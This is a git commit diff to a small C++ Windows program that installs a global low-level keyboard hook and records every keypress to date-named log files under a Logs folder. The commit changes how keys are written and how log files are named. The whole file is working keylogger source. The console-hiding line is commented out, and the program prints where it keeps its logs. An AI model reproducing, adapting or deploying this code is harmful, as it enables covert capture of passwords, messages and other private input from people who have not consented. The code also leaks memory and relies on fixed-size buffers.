2507664ad115e15d1e5fb2f825cd415635f593a9
Hao Svit <haonguyen.svit@gmail.com>
2016-04-20 16:56:21 +0700

    + Fixed write file in many line into write only one line + Fixed log file name is as dd-mm-yyyy.txt

--- HookKeyboard/HookKeyboard.cpp
+++ HookKeyboard/HookKeyboard.cpp
@@ -1,8 +1,10 @@
 #include <iostream>
 #include <fstream>
 #include <Windows.h>
-//#include <string.h>
 #include <string>
+#include <ctime>
+#include <atlbase.h>
+#include <atlconv.h>
 #pragma comment(lib, "user32.lib")
 
 using namespace std;
@@ -10,11 +12,12 @@ using namespace std;
 HHOOK keyboardHook = NULL;
 
 fstream f;
-//FILE *f;
+char * logFolder = ".\\Logs\\";
+char * filePath;
+
 void openFile(char * fileName) 
 {
-	f.open(fileName, ios::app);
-	//f = fopen(fileName, "a");
+	f.open(fileName, fstream::app);
 }
 
 void closeFile()
@@ -23,7 +26,6 @@ void closeFile()
 	{
 		f.close();
 	}
-	//fclose(f);
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -31,14 +33,14 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	if (nCode == HC_ACTION) 
 	{
 		if (wParam == WM_KEYDOWN) {
-			wchar_t tmp[0xFF] = {0};
+			wchar_t tmp[255] = {0};
 			KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lParam);
 						
 			// Get key name as string
 			DWORD msg = 1;
 			msg += (keyInfo.scanCode << 16);
 			msg += (keyInfo.flags << 24);
-			GetKeyNameText(msg, tmp, 0xFF);
+			GetKeyNameText(msg, tmp, 255);
 
 			// Convert wchar_t to char *
 			char* keyName = new char[20];
@@ -81,45 +83,68 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 				strcpy(keyName, keynametmp);
 			}
 
-			//cout << keyName << endl;
-
-			if (f.is_open()) 
-			{
-				f << keyName << endl;
-			}
-
-			/*if (f != NULL)
-			{
-				fprintf(f, "%s ", keyName);
-			}*/
+			openFile(filePath);			
+			f << keyName << " ";
+			closeFile();
 		}
 	}	
 	
 	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
 
+void generateFilePath()
+{
+	time_t tNow = time(0);
+	struct tm* now = localtime(&tNow);
+	char* fileName = new char[15];
+	strcpy(fileName, "");
+
+	char* day = new char[4];
+	itoa(now->tm_mday, day, 10);
+	char* month = new char[3];
+	itoa(now->tm_mon + 1, month, 10);
+	char* year = new char[5];
+	itoa(now->tm_year + 1900, year, 10);
+
+	strcat(fileName, day);
+	strcat(fileName, "-");
+	strcat(fileName, month);
+	strcat(fileName, "-");
+	strcat(fileName, year);
+	strcat(fileName, ".txt");
+
+	filePath = new char[20];
+	strcpy(filePath, "");
+
+	strcat(filePath, logFolder);
+	strcat(filePath, fileName);
+	CreateDirectory(ATL::CA2W(logFolder), false);
+}
+
 int main(int argc, char* argv[])
 {
 	// hide console window
 	//ShowWindow(GetConsoleWindow(), SW_HIDE);
-	
+	generateFilePath();
+	cout << "Logs at: " << filePath << endl;
 
-	openFile(".\\KeyLog.txt");
-	// moc
+	//openFile(filePath);
+
 	// HHOOK SetWindowsHookEx(int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId)
 	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 	if (keyboardHook == NULL) {
 		std::cout << "Keyboard hook failed!" << std::endl;
 	}
 
-	// giu chuong trinh chay
+	cout << "Hooked successfully" << endl;
+	
+	// keep the program running
 	MSG msg;
-
-
 	while (GetMessage(&msg, NULL, 0, 0)) {
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
+
 	closeFile();
 	UnhookWindowsHookEx(keyboardHook);
 	return 0;
